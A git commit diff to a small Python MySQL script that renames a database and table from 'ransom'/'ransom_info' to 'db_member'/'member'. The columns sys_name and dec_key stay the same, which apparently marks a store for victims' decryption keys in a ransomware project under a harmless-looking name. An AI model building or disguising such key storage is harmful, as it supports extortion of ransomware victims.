290166cf3b5d778e687e757d9c42c19557f76a3c
ginnoro2 <84360244+ginnoro2@users.noreply.github.com>
2023-02-12 12:55:18 +0545

    Update try.py
    Mysql connection establish and table block creation.

--- try.py
+++ try.py
@@ -3,14 +3,14 @@ import mysql.connector as mysql
 from  mysql.connector import Error
 
 try:
-    conn = mysql.connect(host='localhost', database='ransom', user='root', password='')
+    conn = mysql.connect(host='localhost', database='db_member', user='root', password='')
     if conn.is_connected():
         cursor = conn.cursor()
         cursor.execute("select database();")
         record = cursor.fetchone()
 
-        cursor.execute('DROP TABLE IF EXISTS ransom_info;')
+        cursor.execute('DROP TABLE IF EXISTS member;')
 
-        cursor.execute("CREATE TABLE ransom_info(time varchar(255),sys_name varchar(255),dec_key varchar(255))")
+        cursor.execute("CREATE TABLE member(time varchar(255),sys_name varchar(255),dec_key varchar(255))")
 except Error as e:
             pass
